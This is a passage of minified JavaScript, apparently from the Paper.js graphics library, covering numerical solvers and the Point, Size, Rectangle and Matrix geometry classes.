                a = 1.12e-16;
            function l(t, e, i) {
                return t < e ? e : t > i ? i : t;
            }
            function u(t, e, n) {
                function s(t) {
                    var e = 134217729 * t,
                        i = t - e + e;
                    return [i, t - i];
                }
                var r = e * e - t * n,
                    o = e * e + t * n;
                if (3 * i(r) < o) {
                    var a = s(t),
                        l = s(e),
                        h = s(n),
                        u = e * e,
                        c = t * n;
                    r = u - c + (l[0] * l[0] - u + 2 * l[0] * l[1] + l[1] * l[1] - (a[0] * h[0] - c + a[0] * h[1] + a[1] * h[0] + a[1] * h[1]));
                }
                return r;
            }
            function c() {
                var t = Math.max.apply(Math, arguments);
                return t && (t < 1e-8 || t > 1e8) ? s(2, -Math.round(r(t))) : 0;
            }
            return {
                EPSILON: o,
                MACHINE_EPSILON: a,
                CURVETIME_EPSILON: 1e-8,
                GEOMETRIC_EPSILON: 1e-7,
                TRIGONOMETRIC_EPSILON: 1e-8,
                KAPPA: (4 * (n(2) - 1)) / 3,
                isZero: function (t) {
                    return t >= -o && t <= o;
                },
                clamp: l,
                integrate: function (i, n, s, r) {
                    for (var o = t[r - 2], a = e[r - 2], l = 0.5 * (s - n), h = l + n, u = 0, c = (r + 1) >> 1, d = 1 & r ? a[u++] * i(h) : 0; u < c; ) {
                        var f = l * o[u];
                        d += a[u++] * (i(h + f) + i(h - f));
                    }
                    return l * d;
                },
                findRoot: function (t, e, n, s, r, o, a) {
                    for (var h = 0; h < o; h++) {
                        var u = t(n),
                            c = u / e(n),
                            d = n - c;
                        if (i(c) < a) {
                            n = d;
                            break;
                        }
                        u > 0 ? ((r = n), (n = d <= s ? 0.5 * (s + r) : d)) : ((s = n), (n = d >= r ? 0.5 * (s + r) : d));
                    }
                    return l(n, s, r);
                },
                solveQuadratic: function (t, e, s, r, h, d) {
                    var f,
                        p = 1 / 0;
                    if (i(t) < o) {
                        if (i(e) < o) return i(s) < o ? -1 : 0;
                        f = -s / e;
                    } else {
                        var g = u(t, (e *= -0.5), s);
                        if (g && i(g) < a) {
                            var v = c(i(t), i(e), i(s));
                            v && (g = u((t *= v), (e *= v), (s *= v)));
                        }
                        if (g >= -a) {
                            var m = g < 0 ? 0 : n(g),
                                _ = e + (e < 0 ? -m : m);
                            0 === _ ? (p = -(f = s / t)) : ((f = _ / t), (p = s / _));
                        }
                    }
                    var y = 0,
                        w = null == h,
                        x = h - o,
                        b = d + o;
                    return isFinite(f) && (w || (f > x && f < b)) && (r[y++] = w ? f : l(f, h, d)), p !== f && isFinite(p) && (w || (p > x && p < b)) && (r[y++] = w ? p : l(p, h, d)), y;
                },
                solveCubic: function (t, e, r, u, d, f, p) {
                    var g,
                        v,
                        m,
                        _,
                        y,
                        w = c(i(t), i(e), i(r), i(u));
                    function x(i) {
                        var n = t * (g = i);
                        (_ = (n + (v = n + e)) * g + (m = v * g + r)), (y = m * g + u);
                    }
                    if ((w && ((t *= w), (e *= w), (r *= w), (u *= w)), i(t) < o)) (t = e), (v = r), (m = u), (g = 1 / 0);
                    else if (i(u) < o) (v = e), (m = r), (g = 0);
                    else {
                        x(-e / t / 3);
                        var b = y / t,
                            S = s(i(b), 1 / 3),
                            C = b < 0 ? -1 : 1,
                            T = -_ / t,
                            k = T > 0 ? 1.324717957244746 * Math.max(S, n(T)) : S,
                            I = g - C * k;
                        if (I !== g) {
                            for (; x(I), C * (I = 0 === _ ? g : g - y / _ / (1 + a)) > C * g; );
                            i(t) * g * g > i(u / g) && (v = ((m = -u / g) - r) / g);
                        }
                    }
                    var O = h.solveQuadratic(t, v, m, d, f, p),
                        P = null == f;
                    return isFinite(g) && (0 === O || (O > 0 && g !== d[0] && g !== d[1])) && (P || (g > f - o && g < p + o)) && (d[O++] = P ? g : l(g, f, p)), O;
                },
            };
        })(),
        u = {
            _id: 1,
            _pools: {},
            get: function (t) {
                if (t) {
                    var e = this._pools[t];
                    return e || (e = this._pools[t] = { _id: 1 }), e._id++;
                }
                return this._id++;
            },
        },
        c = s.extend(
            {
                _class: "Point",
                _readIndex: !0,
                initialize: function (t, e) {
                    var i = typeof t,
                        n = this.__read,
                        s = 0;
                    if ("number" === i) {
                        var r = "number" == typeof e;
                        this._set(t, r ? e : t), n && (s = r ? 2 : 1);
                    } else if ("undefined" === i || null === t) this._set(0, 0), n && (s = null === t ? 1 : 0);
                    else {
                        var o = "string" === i ? t.split(/[\s,]+/) || [] : t;
                        (s = 1),
                            Array.isArray(o)
                                ? this._set(+o[0], +(o.length > 1 ? o[1] : o[0]))
                                : "x" in o
                                ? this._set(o.x || 0, o.y || 0)
                                : "width" in o
                                ? this._set(o.width || 0, o.height || 0)
                                : "angle" in o
                                ? (this._set(o.length || 0, 0), this.setAngle(o.angle || 0))
                                : (this._set(0, 0), (s = 0));
                    }
                    return n && (this.__read = s), this;
                },
                set: "#initialize",
                _set: function (t, e) {
                    return (this.x = t), (this.y = e), this;
                },
                equals: function (t) {
                    return this === t || (t && ((this.x === t.x && this.y === t.y) || (Array.isArray(t) && this.x === t[0] && this.y === t[1]))) || !1;
                },
                clone: function () {
                    return new c(this.x, this.y);
                },
                toString: function () {
                    var t = l.instance;
                    return "{ x: " + t.number(this.x) + ", y: " + t.number(this.y) + " }";
                },
                _serialize: function (t) {
                    var e = t.formatter;
                    return [e.number(this.x), e.number(this.y)];
                },
                getLength: function () {
                    return Math.sqrt(this.x * this.x + this.y * this.y);
                },
                setLength: function (t) {
                    if (this.isZero()) {
                        var e = this._angle || 0;
                        this._set(Math.cos(e) * t, Math.sin(e) * t);
                    } else {
                        var i = t / this.getLength();
                        h.isZero(i) && this.getAngle(), this._set(this.x * i, this.y * i);
                    }
                },
                getAngle: function () {
                    return (180 * this.getAngleInRadians.apply(this, arguments)) / Math.PI;
                },
                setAngle: function (t) {
                    this.setAngleInRadians.call(this, (t * Math.PI) / 180);
                },
                getAngleInDegrees: "#getAngle",
                setAngleInDegrees: "#setAngle",
                getAngleInRadians: function () {
                    if (arguments.length) {
                        var t = c.read(arguments),
                            e = this.getLength() * t.getLength();
                        if (h.isZero(e)) return NaN;
                        var i = this.dot(t) / e;
                        return Math.acos(i < -1 ? -1 : i > 1 ? 1 : i);
                    }
                    return this.isZero() ? this._angle || 0 : (this._angle = Math.atan2(this.y, this.x));
                },
                setAngleInRadians: function (t) {
                    if (((this._angle = t), !this.isZero())) {
                        var e = this.getLength();
                        this._set(Math.cos(t) * e, Math.sin(t) * e);
                    }
                },
                getQuadrant: function () {
                    return this.x >= 0 ? (this.y >= 0 ? 1 : 4) : this.y >= 0 ? 2 : 3;
                },
            },
            {
                beans: !1,
                getDirectedAngle: function () {
                    var t = c.read(arguments);
                    return (180 * Math.atan2(this.cross(t), this.dot(t))) / Math.PI;
                },
                getDistance: function () {
                    var t = c.read(arguments),
                        e = t.x - this.x,
                        i = t.y - this.y,
                        n = e * e + i * i;
                    return s.read(arguments) ? n : Math.sqrt(n);
                },
                normalize: function (t) {
                    t === e && (t = 1);
                    var i = this.getLength(),
                        n = 0 !== i ? t / i : 0,
                        s = new c(this.x * n, this.y * n);
                    return n >= 0 && (s._angle = this._angle), s;
                },
                rotate: function (t, e) {
                    if (0 === t) return this.clone();
                    t = (t * Math.PI) / 180;
                    var i = e ? this.subtract(e) : this,
                        n = Math.sin(t),
                        s = Math.cos(t);
                    return (i = new c(i.x * s - i.y * n, i.x * n + i.y * s)), e ? i.add(e) : i;
                },
                transform: function (t) {
                    return t ? t._transformPoint(this) : this;
                },
                add: function () {
                    var t = c.read(arguments);
                    return new c(this.x + t.x, this.y + t.y);
                },
                subtract: function () {
                    var t = c.read(arguments);
                    return new c(this.x - t.x, this.y - t.y);
                },
                multiply: function () {
                    var t = c.read(arguments);
                    return new c(this.x * t.x, this.y * t.y);
                },
                divide: function () {
                    var t = c.read(arguments);
                    return new c(this.x / t.x, this.y / t.y);
                },
                modulo: function () {
                    var t = c.read(arguments);
                    return new c(this.x % t.x, this.y % t.y);
                },
                negate: function () {
                    return new c(-this.x, -this.y);
                },
                isInside: function () {
                    return g.read(arguments).contains(this);
                },
                isClose: function () {
                    var t = c.read(arguments),
                        e = s.read(arguments);
                    return this.getDistance(t) <= e;
                },
                isCollinear: function () {
                    var t = c.read(arguments);
                    return c.isCollinear(this.x, this.y, t.x, t.y);
                },
                isColinear: "#isCollinear",
                isOrthogonal: function () {
                    var t = c.read(arguments);
                    return c.isOrthogonal(this.x, this.y, t.x, t.y);
                },
                isZero: function () {
                    var t = h.isZero;
                    return t(this.x) && t(this.y);
                },
                isNaN: function () {
                    return isNaN(this.x) || isNaN(this.y);
                },
                isInQuadrant: function (t) {
                    return this.x * (t > 1 && t < 4 ? -1 : 1) >= 0 && this.y * (t > 2 ? -1 : 1) >= 0;
                },
                dot: function () {
                    var t = c.read(arguments);
                    return this.x * t.x + this.y * t.y;
                },
                cross: function () {
                    var t = c.read(arguments);
                    return this.x * t.y - this.y * t.x;
                },
                project: function () {
                    var t = c.read(arguments),
                        e = t.isZero() ? 0 : this.dot(t) / t.dot(t);
                    return new c(t.x * e, t.y * e);
                },
                statics: {
                    min: function () {
                        var t = c.read(arguments),
                            e = c.read(arguments);
                        return new c(Math.min(t.x, e.x), Math.min(t.y, e.y));
                    },
                    max: function () {
                        var t = c.read(arguments),
                            e = c.read(arguments);
                        return new c(Math.max(t.x, e.x), Math.max(t.y, e.y));
                    },
                    random: function () {
                        return new c(Math.random(), Math.random());
                    },
                    isCollinear: function (t, e, i, n) {
                        return Math.abs(t * n - e * i) <= 1e-8 * Math.sqrt((t * t + e * e) * (i * i + n * n));
                    },
                    isOrthogonal: function (t, e, i, n) {
                        return Math.abs(t * i + e * n) <= 1e-8 * Math.sqrt((t * t + e * e) * (i * i + n * n));
                    },
                },
            },
            s.each(
                ["round", "ceil", "floor", "abs"],
                function (t) {
                    var e = Math[t];
                    this[t] = function () {
                        return new c(e(this.x), e(this.y));
                    };
                },
                {}
            )
        ),
        d = c.extend({
            initialize: function (t, e, i, n) {
                (this._x = t), (this._y = e), (this._owner = i), (this._setter = n);
            },
            _set: function (t, e, i) {
                return (this._x = t), (this._y = e), i || this._owner[this._setter](this), this;
            },
            getX: function () {
                return this._x;
            },
            setX: function (t) {
                (this._x = t), this._owner[this._setter](this);
            },
            getY: function () {
                return this._y;
            },
            setY: function (t) {
                (this._y = t), this._owner[this._setter](this);
            },
            isSelected: function () {
                return !!(this._owner._selection & this._getSelection());
            },
            setSelected: function (t) {
                this._owner._changeSelection(this._getSelection(), t);
            },
            _getSelection: function () {
                return "setPosition" === this._setter ? 4 : 0;
            },
        }),
        f = s.extend(
            {
                _class: "Size",
                _readIndex: !0,
                initialize: function (t, e) {
                    var i = typeof t,
                        n = this.__read,
                        s = 0;
                    if ("number" === i) {
                        var r = "number" == typeof e;
                        this._set(t, r ? e : t), n && (s = r ? 2 : 1);
                    } else if ("undefined" === i || null === t) this._set(0, 0), n && (s = null === t ? 1 : 0);
                    else {
                        var o = "string" === i ? t.split(/[\s,]+/) || [] : t;
                        (s = 1), Array.isArray(o) ? this._set(+o[0], +(o.length > 1 ? o[1] : o[0])) : "width" in o ? this._set(o.width || 0, o.height || 0) : "x" in o ? this._set(o.x || 0, o.y || 0) : (this._set(0, 0), (s = 0));
                    }
                    return n && (this.__read = s), this;
                },
                set: "#initialize",
                _set: function (t, e) {
                    return (this.width = t), (this.height = e), this;
                },
                equals: function (t) {
                    return t === this || (t && ((this.width === t.width && this.height === t.height) || (Array.isArray(t) && this.width === t[0] && this.height === t[1]))) || !1;
                },
                clone: function () {
                    return new f(this.width, this.height);
                },
                toString: function () {
                    var t = l.instance;
                    return "{ width: " + t.number(this.width) + ", height: " + t.number(this.height) + " }";
                },
                _serialize: function (t) {
                    var e = t.formatter;
                    return [e.number(this.width), e.number(this.height)];
                },
                add: function () {
                    var t = f.read(arguments);
                    return new f(this.width + t.width, this.height + t.height);
                },
                subtract: function () {
                    var t = f.read(arguments);
                    return new f(this.width - t.width, this.height - t.height);
                },
                multiply: function () {
                    var t = f.read(arguments);
                    return new f(this.width * t.width, this.height * t.height);
                },
                divide: function () {
                    var t = f.read(arguments);
                    return new f(this.width / t.width, this.height / t.height);
                },
                modulo: function () {
                    var t = f.read(arguments);
                    return new f(this.width % t.width, this.height % t.height);
                },
                negate: function () {
                    return new f(-this.width, -this.height);
                },
                isZero: function () {
                    var t = h.isZero;
                    return t(this.width) && t(this.height);
                },
                isNaN: function () {
                    return isNaN(this.width) || isNaN(this.height);
                },
                statics: {
                    min: function (t, e) {
                        return new f(Math.min(t.width, e.width), Math.min(t.height, e.height));
                    },
                    max: function (t, e) {
                        return new f(Math.max(t.width, e.width), Math.max(t.height, e.height));
                    },
                    random: function () {
                        return new f(Math.random(), Math.random());
                    },
                },
            },
            s.each(
                ["round", "ceil", "floor", "abs"],
                function (t) {
                    var e = Math[t];
                    this[t] = function () {
                        return new f(e(this.width), e(this.height));
                    };
                },
                {}
            )
        ),
        p = f.extend({
            initialize: function (t, e, i, n) {
                (this._width = t), (this._height = e), (this._owner = i), (this._setter = n);
            },
            _set: function (t, e, i) {
                return (this._width = t), (this._height = e), i || this._owner[this._setter](this), this;
            },
            getWidth: function () {
                return this._width;
            },
            setWidth: function (t) {
                (this._width = t), this._owner[this._setter](this);
            },
            getHeight: function () {
                return this._height;
            },
            setHeight: function (t) {
                (this._height = t), this._owner[this._setter](this);
            },
        }),
        g = s.extend(
            {
                _class: "Rectangle",
                _readIndex: !0,
                beans: !0,
                initialize: function (t, i, n, r) {
                    var o,
                        a = typeof t;
                    if (
                        ("number" === a
                            ? (this._set(t, i, n, r), (o = 4))
                            : "undefined" === a || null === t
                            ? (this._set(0, 0, 0, 0), (o = null === t ? 1 : 0))
                            : 1 === arguments.length &&
                              (Array.isArray(t)
                                  ? (this._set.apply(this, t), (o = 1))
                                  : t.x !== e || t.width !== e
                                  ? (this._set(t.x || 0, t.y || 0, t.width || 0, t.height || 0), (o = 1))
                                  : t.from === e && t.to === e && (this._set(0, 0, 0, 0), s.filter(this, t), (o = 1))),
                        o === e)
                    ) {
                        var l,
                            h,
                            u = c.readNamed(arguments, "from"),
                            d = s.peek(arguments),
                            p = u.x,
                            g = u.y;
                        if ((d && d.x !== e) || s.hasNamed(arguments, "to")) {
                            var v = c.readNamed(arguments, "to");
                            (l = v.x - p), (h = v.y - g), l < 0 && ((p = v.x), (l = -l)), h < 0 && ((g = v.y), (h = -h));
                        } else {
                            var m = f.read(arguments);
                            (l = m.width), (h = m.height);
                        }
                        this._set(p, g, l, h), (o = arguments.__index);
                        var _ = arguments.__filtered;
                        _ && (this.__filtered = _);
                    }
                    return this.__read && (this.__read = o), this;
                },
                set: "#initialize",
                _set: function (t, e, i, n) {
                    return (this.x = t), (this.y = e), (this.width = i), (this.height = n), this;
                },
                clone: function () {
                    return new g(this.x, this.y, this.width, this.height);
                },
                equals: function (t) {
                    var e = s.isPlainValue(t) ? g.read(arguments) : t;
                    return e === this || (e && this.x === e.x && this.y === e.y && this.width === e.width && this.height === e.height) || !1;
                },
                toString: function () {
                    var t = l.instance;
                    return "{ x: " + t.number(this.x) + ", y: " + t.number(this.y) + ", width: " + t.number(this.width) + ", height: " + t.number(this.height) + " }";
                },
                _serialize: function (t) {
                    var e = t.formatter;
                    return [e.number(this.x), e.number(this.y), e.number(this.width), e.number(this.height)];
                },
                getPoint: function (t) {
                    return new (t ? c : d)(this.x, this.y, this, "setPoint");
                },
                setPoint: function () {
                    var t = c.read(arguments);
                    (this.x = t.x), (this.y = t.y);
                },
                getSize: function (t) {
                    return new (t ? f : p)(this.width, this.height, this, "setSize");
                },
                _fw: 1,
                _fh: 1,
                setSize: function () {
                    var t = f.read(arguments),
                        e = this._sx,
                        i = this._sy,
                        n = t.width,
                        s = t.height;
                    e && (this.x += (this.width - n) * e), i && (this.y += (this.height - s) * i), (this.width = n), (this.height = s), (this._fw = this._fh = 1);
                },
                getLeft: function () {
                    return this.x;
                },
                setLeft: function (t) {
                    if (!this._fw) {
                        var e = t - this.x;
                        this.width -= 0.5 === this._sx ? 2 * e : e;
                    }
                    (this.x = t), (this._sx = this._fw = 0);
                },
                getTop: function () {
                    return this.y;
                },
                setTop: function (t) {
                    if (!this._fh) {
                        var e = t - this.y;
                        this.height -= 0.5 === this._sy ? 2 * e : e;
                    }
                    (this.y = t), (this._sy = this._fh = 0);
                },
                getRight: function () {
                    return this.x + this.width;
                },
                setRight: function (t) {
                    if (!this._fw) {
                        var e = t - this.x;
                        this.width = 0.5 === this._sx ? 2 * e : e;
                    }
                    (this.x = t - this.width), (this._sx = 1), (this._fw = 0);
                },
                getBottom: function () {
                    return this.y + this.height;
                },
                setBottom: function (t) {
                    if (!this._fh) {
                        var e = t - this.y;
                        this.height = 0.5 === this._sy ? 2 * e : e;
                    }
                    (this.y = t - this.height), (this._sy = 1), (this._fh = 0);
                },
                getCenterX: function () {
                    return this.x + this.width / 2;
                },
                setCenterX: function (t) {
                    this._fw || 0.5 === this._sx ? (this.x = t - this.width / 2) : (this._sx && (this.x += 2 * (t - this.x) * this._sx), (this.width = 2 * (t - this.x))), (this._sx = 0.5), (this._fw = 0);
                },
                getCenterY: function () {
                    return this.y + this.height / 2;
                },
                setCenterY: function (t) {
                    this._fh || 0.5 === this._sy ? (this.y = t - this.height / 2) : (this._sy && (this.y += 2 * (t - this.y) * this._sy), (this.height = 2 * (t - this.y))), (this._sy = 0.5), (this._fh = 0);
                },
                getCenter: function (t) {
                    return new (t ? c : d)(this.getCenterX(), this.getCenterY(), this, "setCenter");
                },
                setCenter: function () {
                    var t = c.read(arguments);
                    return this.setCenterX(t.x), this.setCenterY(t.y), this;
                },
                getArea: function () {
                    return this.width * this.height;
                },
                isEmpty: function () {
                    return 0 === this.width || 0 === this.height;
                },
                contains: function (t) {
                    return (t && t.width !== e) || 4 === (Array.isArray(t) ? t : arguments).length ? this._containsRectangle(g.read(arguments)) : this._containsPoint(c.read(arguments));
                },
                _containsPoint: function (t) {
                    var e = t.x,
                        i = t.y;
                    return e >= this.x && i >= this.y && e <= this.x + this.width && i <= this.y + this.height;
                },
                _containsRectangle: function (t) {
                    var e = t.x,
                        i = t.y;
                    return e >= this.x && i >= this.y && e + t.width <= this.x + this.width && i + t.height <= this.y + this.height;
                },
                intersects: function () {
                    var t = g.read(arguments),
                        e = s.read(arguments) || 0;
                    return t.x + t.width > this.x - e && t.y + t.height > this.y - e && t.x < this.x + this.width + e && t.y < this.y + this.height + e;
                },
                intersect: function () {
                    var t = g.read(arguments),
                        e = Math.max(this.x, t.x),
                        i = Math.max(this.y, t.y),
                        n = Math.min(this.x + this.width, t.x + t.width),
                        s = Math.min(this.y + this.height, t.y + t.height);
                    return new g(e, i, n - e, s - i);
                },
                unite: function () {
                    var t = g.read(arguments),
                        e = Math.min(this.x, t.x),
                        i = Math.min(this.y, t.y),
                        n = Math.max(this.x + this.width, t.x + t.width),
                        s = Math.max(this.y + this.height, t.y + t.height);
                    return new g(e, i, n - e, s - i);
                },
                include: function () {
                    var t = c.read(arguments),
                        e = Math.min(this.x, t.x),
                        i = Math.min(this.y, t.y),
                        n = Math.max(this.x + this.width, t.x),
                        s = Math.max(this.y + this.height, t.y);
                    return new g(e, i, n - e, s - i);
                },
                expand: function () {
                    var t = f.read(arguments),
                        e = t.width,
                        i = t.height;
                    return new g(this.x - e / 2, this.y - i / 2, this.width + e, this.height + i);
                },
                scale: function (t, i) {
                    return this.expand(this.width * t - this.width, this.height * (i === e ? t : i) - this.height);
                },
            },
            s.each(
                [
                    ["Top", "Left"],
                    ["Top", "Right"],
                    ["Bottom", "Left"],
                    ["Bottom", "Right"],
                    ["Left", "Center"],
                    ["Top", "Center"],
                    ["Right", "Center"],
                    ["Bottom", "Center"],
                ],
                function (t, e) {
                    var i = t.join(""),
                        n = /^[RL]/.test(i);
                    e >= 4 && (t[1] += n ? "Y" : "X");
                    var s = t[n ? 0 : 1],
                        r = t[n ? 1 : 0],
                        o = "get" + s,
                        a = "get" + r,
                        l = "set" + s,
                        h = "set" + r,
                        u = "set" + i;
                    (this["get" + i] = function (t) {
                        return new (t ? c : d)(this[o](), this[a](), this, u);
                    }),
                        (this[u] = function () {
                            var t = c.read(arguments);
                            this[l](t.x), this[h](t.y);
                        });
                },
                { beans: !0 }
            )
        ),
        v = g.extend(
            {
                initialize: function (t, e, i, n, s, r) {
                    this._set(t, e, i, n, !0), (this._owner = s), (this._setter = r);
                },
                _set: function (t, e, i, n, s) {
                    return (this._x = t), (this._y = e), (this._width = i), (this._height = n), s || this._owner[this._setter](this), this;
                },
            },
            new (function () {
                var t = g.prototype;
                return s.each(
                    ["x", "y", "width", "height"],
                    function (t) {
                        var e = s.capitalize(t),
                            i = "_" + t;
                        (this["get" + e] = function () {
                            return this[i];
                        }),
                            (this["set" + e] = function (t) {
                                (this[i] = t), this._dontNotify || this._owner[this._setter](this);
                            });
                    },
                    s.each(
                        ["Point", "Size", "Center", "Left", "Top", "Right", "Bottom", "CenterX", "CenterY", "TopLeft", "TopRight", "BottomLeft", "BottomRight", "LeftCenter", "TopCenter", "RightCenter", "BottomCenter"],
                        function (e) {
                            var i = "set" + e;
                            this[i] = function () {
                                (this._dontNotify = !0), t[i].apply(this, arguments), (this._dontNotify = !1), this._owner[this._setter](this);
                            };
                        },
                        {
                            isSelected: function () {
                                return !!(2 & this._owner._selection);
                            },
                            setSelected: function (t) {
                                var e = this._owner;
                                e._changeSelection && e._changeSelection(2, t);
                            },
                        }
                    )
                );
            })()
        ),
        m = s.extend(
            {
                _class: "Matrix",
                initialize: function t(e, i) {
                    var n = arguments.length,
                        s = !0;
                    if (
                        (n >= 6
                            ? this._set.apply(this, arguments)
                            : 1 === n || 2 === n
                            ? e instanceof t
                                ? this._set(e._a, e._b, e._c, e._d, e._tx, e._ty, i)
                                : Array.isArray(e)
                                ? this._set.apply(this, i ? e.concat([i]) : e)
                                : (s = !1)
                            : n
                            ? (s = !1)
                            : this.reset(),
                        !s)
                    )
                        throw new Error("Unsupported matrix parameters");
                    return this;
                },
                set: "#initialize",
                _set: function (t, e, i, n, s, r, o) {
                    return (this._a = t), (this._b = e), (this._c = i), (this._d = n), (this._tx = s), (this._ty = r), o || this._changed(), this;
                },
                _serialize: function (t, e) {
                    return s.serialize(this.getValues(), t, !0, e);
                },
                _changed: function () {
                    var t = this._owner;
                    t && (t._applyMatrix ? t.transform(null, !0) : t._changed(25));
                },
                clone: function () {
                    return new m(this._a, this._b, this._c, this._d, this._tx, this._ty);
                },
                equals: function (t) {
                    return t === this || (t && this._a === t._a && this._b === t._b && this._c === t._c && this._d === t._d && this._tx === t._tx && this._ty === t._ty);
                },
                toString: function () {
                    var t = l.instance;
                    return "[[" + [t.number(this._a), t.number(this._c), t.number(this._tx)].join(", ") + "], [" + [t.number(this._b), t.number(this._d), t.number(this._ty)].join(", ") + "]]";
                },
                reset: function (t) {
                    return (this._a = this._d = 1), (this._b = this._c = this._tx = this._ty = 0), t || this._changed(), this;
                },
                apply: function (t, e) {
                    var i = this._owner;
                    return !!i && (i.transform(null, !0, s.pick(t, !0), e), this.isIdentity());
                },
                translate: function () {
                    var t = c.read(arguments),
                        e = t.x,
                        i = t.y;
                    return (this._tx += e * this._a + i * this._c), (this._ty += e * this._b + i * this._d), this._changed(), this;
                },
                scale: function () {
                    var t = c.read(arguments),
                        e = c.read(arguments, 0, { readNull: !0 });
                    return e && this.translate(e), (this._a *= t.x), (this._b *= t.x), (this._c *= t.y), (this._d *= t.y), e && this.translate(e.negate()), this._changed(), this;
                },
                rotate: function (t) {
                    t *= Math.PI / 180;
                    var e = c.read(arguments, 1),
                        i = e.x,
                        n = e.y,
                        s = Math.cos(t),
                        r = Math.sin(t),
                        o = i - i * s + n * r,
                        a = n - i * r - n * s,
                        l = this._a,
                        h = this._b,
                        u = this._c,
                        d = this._d;
                    return (this._a = s * l + r * u), (this._b = s * h + r * d), (this._c = -r * l + s * u), (this._d = -r * h + s * d), (this._tx += o * l + a * u), (this._ty += o * h + a * d), this._changed(), this;
                },
                shear: function () {
                    var t = c.read(arguments),
                        e = c.read(arguments, 0, { readNull: !0 });
                    e && this.translate(e);
                    var i = this._a,
                        n = this._b;
                    return (this._a += t.y * this._c), (this._b += t.y * this._d), (this._c += t.x * i), (this._d += t.x * n), e && this.translate(e.negate()), this._changed(), this;
                },
                skew: function () {
                    var t = c.read(arguments),
                        e = c.read(arguments, 0, { readNull: !0 }),
                        i = Math.PI / 180,
                        n = new c(Math.tan(t.x * i), Math.tan(t.y * i));
                    return this.shear(n, e);
                },
                append: function (t, e) {
                    if (t) {
                        var i = this._a,
                            n = this._b,
                            s = this._c,
                            r = this._d,
                            o = t._a,
                            a = t._c,
                            l = t._b,
                            h = t._d,
                            u = t._tx,
                            c = t._ty;
                        (this._a = o * i + l * s), (this._c = a * i + h * s), (this._b = o * n + l * r), (this._d = a * n + h * r), (this._tx += u * i + c * s), (this._ty += u * n + c * r), e || this._changed();
                    }
                    return this;
                },
                prepend: function (t, e) {
                    if (t) {
                        var i = this._a,
                            n = this._b,
                            s = this._c,
                            r = this._d,
                            o = this._tx,
                            a = this._ty,
                            l = t._a,
                            h = t._c,
                            u = t._b,
                            c = t._d,
                            d = t._tx,
                            f = t._ty;
                        (this._a = l * i + h * n), (this._c = l * s + h * r), (this._b = u * i + c * n), (this._d = u * s + c * r), (this._tx = l * o + h * a + d), (this._ty = u * o + c * a + f), e || this._changed();
                    }
                    return this;
                },
                appended: function (t) {
                    return this.clone().append(t);
                },
                prepended: function (t) {
                    return this.clone().prepend(t);
                },
                invert: function () {
                    var t = this._a,
                        e = this._b,
                        i = this._c,
                        n = this._d,
                        s = this._tx,
                        r = this._ty,
                        o = t * n - e * i,
                        a = null;
                    return o && !isNaN(o) && isFinite(s) && isFinite(r) && ((this._a = n / o), (this._b = -e / o), (this._c = -i / o), (this._d = t / o), (this._tx = (i * r - n * s) / o), (this._ty = (e * s - t * r) / o), (a = this)), a;
                },
                inverted: function () {
                    return this.clone().invert();
                },
                concatenate: "#append",
                preConcatenate: "#prepend",
                chain: "#appended",
                _shiftless: function () {
                    return new m(this._a, this._b, this._c, this._d, 0, 0);
                },
                _orNullIfIdentity: function () {
                    return this.isIdentity() ? null : this;
                },
                isIdentity: function () {
                    return 1 === this._a && 0 === this._b && 0 === this._c && 1 === this._d && 0 === this._tx && 0 === this._ty;
                },
                isInvertible: function () {
                    var t = this._a * this._d - this._c * this._b;
                    return t && !isNaN(t) && isFinite(this._tx) && isFinite(this._ty);
                },
                isSingular: function () {
                    return !this.isInvertible();
                },
                transform: function (t, e, i) {
                    return arguments.length < 3 ? this._transformPoint(c.read(arguments)) : this._transformCoordinates(t, e, i);
                },
                _transformPoint: function (t, e, i) {
                    var n = t.x,
                        s = t.y;
                    return e || (e = new c()), e._set(n * this._a + s * this._c + this._tx, n * this._b + s * this._d + this._ty, i);
                },
                _transformCoordinates: function (t, e, i) {
                    for (var n = 0, s = 2 * i; n < s; n += 2) {
                        var r = t[n],
                            o = t[n + 1];
                        (e[n] = r * this._a + o * this._c + this._tx), (e[n + 1] = r * this._b + o * this._d + this._ty);
                    }
                    return e;
                },
                _transformCorners: function (t) {
                    var e = t.x,
                        i = t.y,
                        n = e + t.width,
                        s = i + t.height,
                        r = [e, i, n, i, n, s, e, s];
                    return this._transformCoordinates(r, r, 4);
                },
                _transformBounds: function (t, e, i) {
                    for (var n = this._transformCorners(t), s = n.slice(0, 2), r = s.slice(), o = 2; o < 8; o++) {
                        var a = n[o],
                            l = 1 & o;
                        a < s[l] ? (s[l] = a) : a > r[l] && (r[l] = a);
                    }
                    return e || (e = new g()), e._set(s[0], s[1], r[0] - s[0], r[1] - s[1], i);
                },
                inverseTransform: function () {
                    return this._inverseTransform(c.read(arguments));
                },
                _inverseTransform: function (t, e, i) {
                    var n = this._a,
                        s = this._b,
                        r = this._c,
                        o = this._d,
                        a = this._tx,
                        l = this._ty,
                        h = n * o - s * r,
                        u = null;
                    if (h && !isNaN(h) && isFinite(a) && isFinite(l)) {
                        var d = t.x - this._tx,
                            f = t.y - this._ty;
                        e || (e = new c()), (u = e._set((d * o - f * r) / h, (f * n - d * s) / h, i));
                    }
                    return u;
                },
                decompose: function () {
                    var t,
                        e,
                        i,
                        n = this._a,
                        s = this._b,
                        r = this._c,
                        o = this._d,
                        a = n * o - s * r,
                        l = Math.sqrt,
                        h = Math.atan2,
                        u = 180 / Math.PI;
                    if (0 !== n || 0 !== s) {
                        var d = l(n * n + s * s);
                        (t = Math.acos(n / d) * (s > 0 ? 1 : -1)), (e = [d, a / d]), (i = [h(n * r + s * o, d * d), 0]);
                    } else if (0 !== r || 0 !== o) {
                        var f = l(r * r + o * o);
                        (t = Math.asin(r / f) * (o > 0 ? 1 : -1)), (e = [a / f, f]), (i = [0, h(n * r + s * o, f * f)]);
                    } else (t = 0), (i = e = [0, 0]);
                    return { translation: this.getTranslation(), rotation: t * u, scaling: new c(e), skewing: new c(i[0] * u, i[1] * u) };
                },
                getValues: function () {
                    return [this._a, this._b, this._c, this._d, this._tx, this._ty];
                },
                getTranslation: function () {
                    return new c(this._tx, this._ty);
                },
                getScaling: function () {
                    return this.decompose().scaling;
                },
                getRotation: function () {
                    return this.decompose().rotation;
                },
                applyToContext: function (t) {
                    this.isIdentity() || t.transform(this._a, this._b, this._c, this._d, this._tx, this._ty);
                },
            },
            s.each(
                ["a", "b", "c", "d", "tx", "ty"],
                function (t) {
                    var e = s.capitalize(t),
                        i = "_" + t;
                    (this["get" + e] = function () {
                        return this[i];
                    }),
                        (this["set" + e] = function (t) {
                            (this[i] = t), this._changed();
                        });
                },
                {}
            )
        ),
        _ = s.extend({
            _class: "Line",
            initialize: function (t, e, i, n, s) {
